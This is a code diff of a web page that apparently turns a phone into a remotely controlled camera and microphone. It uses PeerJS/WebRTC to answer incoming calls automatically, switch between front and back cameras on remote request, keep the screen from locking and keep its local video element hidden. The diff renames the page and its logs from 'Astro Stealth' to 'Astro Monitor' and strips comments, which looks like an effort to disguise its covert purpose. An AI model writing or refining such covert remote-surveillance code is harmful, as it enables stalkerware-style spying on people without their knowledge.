@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Astro Stealth - Switchable Camera</title>
+    <title>Astro Monitor - Remote Camera</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -39,18 +39,17 @@
         let currentCamera = "front";
         let wakeLock = null;
         
-        // Camera device IDs from your debug tool
+        // Camera device IDs
         let FRONT_CAMERA_ID = null;
         let BACK_CAMERA_ID = null;
         
         function log(msg) {
-            console.log(`[STEALTH] ${msg}`);
+            console.log(`[MONITOR] ${msg}`);
         }
         
-        // Detect cameras using the exact logic that worked in your debug tool
+        // Detect cameras
         async function detectCameras() {
             try {
-                // Request permission first
                 await navigator.mediaDevices.getUserMedia({ video: true });
                 
                 const devices = await navigator.mediaDevices.enumerateDevices();
@@ -58,31 +57,27 @@
                 
                 log(`Found ${cameras.length} camera(s):`);
                 cameras.forEach((cam, i) => {
-                    log(`  [${i}] ${cam.label || 'Unnamed'} - ${cam.deviceId.substring(0, 20)}...`);
+                    log(`  [${i}] ${cam.label || 'Unnamed'}`);
                     
-                    // Identify based on your debug output
                     const label = cam.label.toLowerCase();
                     if (label.includes("back") || label.includes("rear") || label.includes("environment")) {
                         BACK_CAMERA_ID = cam.deviceId;
-                        log(`  ✅ Identified as BACK camera`);
+                        log(`  ✅ BACK camera identified`);
                     } else if (label.includes("front") || label.includes("user") || label.includes("face")) {
                         FRONT_CAMERA_ID = cam.deviceId;
-                        log(`  ✅ Identified as FRONT camera`);
+                        log(`  ✅ FRONT camera identified`);
                     }
                 });
                 
-                // Fallback based on your debug output (camera 0 is back, camera 1 is front)
+                // Fallback
                 if (!BACK_CAMERA_ID && cameras[0]) {
                     BACK_CAMERA_ID = cameras[0].deviceId;
-                    log(`  Using camera[0] as BACK (fallback)`);
+                    log(`  Using camera[0] as BACK`);
                 }
                 if (!FRONT_CAMERA_ID && cameras[1]) {
                     FRONT_CAMERA_ID = cameras[1].deviceId;
-                    log(`  Using camera[1] as FRONT (fallback)`);
+                    log(`  Using camera[1] as FRONT`);
                 }
-                
-                log(`FRONT camera ID: ${FRONT_CAMERA_ID?.substring(0, 20)}...`);
-                log(`BACK camera ID: ${BACK_CAMERA_ID?.substring(0, 20)}...`);
                 
                 return true;
             } catch (err) {
@@ -91,7 +86,7 @@
             }
         }
         
-        // Get stream using exact deviceId (same method that worked in debug tool)
+        // Get stream using exact deviceId
         async function getStreamForCamera(camera, isVideo) {
             if (!isVideo) {
                 return await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
@@ -100,10 +95,9 @@
             const useBackCamera = (camera === 'back');
             const targetDeviceId = useBackCamera ? BACK_CAMERA_ID : FRONT_CAMERA_ID;
             
-            // Use exact deviceId (same as debug tool's "Test by DeviceId" which worked)
             if (targetDeviceId) {
                 try {
-                    log(`Getting ${camera} camera with exact deviceId`);
+                    log(`Getting ${camera} camera with deviceId`);
                     const stream = await navigator.mediaDevices.getUserMedia({
                         audio: true,
                         video: {
@@ -112,14 +106,14 @@
                             height: { ideal: 480 }
                         }
                     });
-                    log(`✅ ${camera} camera acquired via deviceId`);
+                    log(`✅ ${camera} camera acquired`);
                     return stream;
                 } catch (err) {
                     log(`deviceId failed: ${err.message}`);
                 }
             }
             
-            // Fallback to facingMode (also worked in debug tool)
+            // Fallback to facingMode
             try {
                 log(`Falling back to facingMode for ${camera}`);
                 const stream = await navigator.mediaDevices.getUserMedia({
@@ -137,14 +131,13 @@
             }
             
             // Final fallback
-            log(`Using default camera for ${camera}`);
             return await navigator.mediaDevices.getUserMedia({
                 audio: true,
                 video: { width: { ideal: 640 }, height: { ideal: 480 } }
             });
         }
         
-        // Fast camera switch - restart just the video with negotiation
+        // Switch camera during active call
         async function switchCamera(targetCamera) {
             if (targetCamera === currentCamera) {
                 log(`Already using ${targetCamera}`);
@@ -167,56 +160,44 @@
                     return;
                 }
                 
-                // Get new stream with desired camera
                 const newStream = await getStreamForCamera(targetCamera, true);
                 const newVideoTrack = newStream.getVideoTracks()[0];
                 
-                if (!newVideoTrack) {
-                    throw new Error('No video track');
-                }
+                if (!newVideoTrack) throw new Error('No video track');
                 
                 const pc = currentCall.peerConnection;
                 if (!pc) throw new Error('No peer connection');
                 
-                // Find the video sender
                 const senders = pc.getSenders();
                 let videoSender = senders.find(s => s.track && s.track.kind === 'video');
                 
                 if (videoSender) {
-                    // Replace the track
                     await videoSender.replaceTrack(newVideoTrack);
                     log(`Video track replaced`);
                     
-                    // Force negotiation to ensure remote updates
+                    // Force negotiation
                     const offer = await pc.createOffer();
                     await pc.setLocalDescription(offer);
-                    log(`Negotiation triggered`);
                 } else {
-                    // No video sender, add new one
                     pc.addTrack(newVideoTrack, newStream);
                     log(`Added new video track`);
                 }
                 
-                // Update audio track if needed
                 const audioSender = senders.find(s => s.track && s.track.kind === 'audio');
                 if (audioSender && newStream.getAudioTracks()[0]) {
                     await audioSender.replaceTrack(newStream.getAudioTracks()[0]);
                 }
                 
-                // Clean up old stream
                 if (localStream && localStream !== newStream) {
                     localStream.getTracks().forEach(t => t.stop());
                 }
                 
                 localStream = newStream;
                 currentCamera = targetCamera;
-                
-                // Update hidden video element
                 document.getElementById('localVideo').srcObject = newStream;
                 
                 log(`✅ Switched to ${targetCamera.toUpperCase()}`);
                 
-                // Notify remote
                 if (dataConn && dataConn.open) {
                     dataConn.send({ type: 'camera_switched', camera: targetCamera });
                 }
@@ -241,10 +222,7 @@
             log(`Incoming ${isVideo ? 'VIDEO' : 'AUDIO'} call`);
             
             try {
-                // Ensure cameras are detected
                 await detectCameras();
-                
-                // Use current camera preference
                 const stream = await getStreamForCamera(currentCamera, isVideo);
                 localStream = stream;
                 
@@ -305,11 +283,11 @@
                 peer = null;
             }
             
-            log(`Initializing stealth as ${MY_ID}`);
+            log(`Initializing monitor as ${MY_ID}`);
             peer = new Peer(MY_ID);
             
             peer.on('open', async () => {
-                log(`✅ Stealth ACTIVE`);
+                log(`✅ Monitor ACTIVE`);
                 await detectCameras();
                 log(`Ready for connection from ${PARTNER_ID}`);
             });
@@ -340,7 +318,8 @@
             });
         }
         
-        log('=== ASTRO STEALTH ===');
+        log('=== ASTRO MONITOR ===');
+        log('Device is ready to be remotely controlled');
         preventScreenLock();
         initPeer();
         
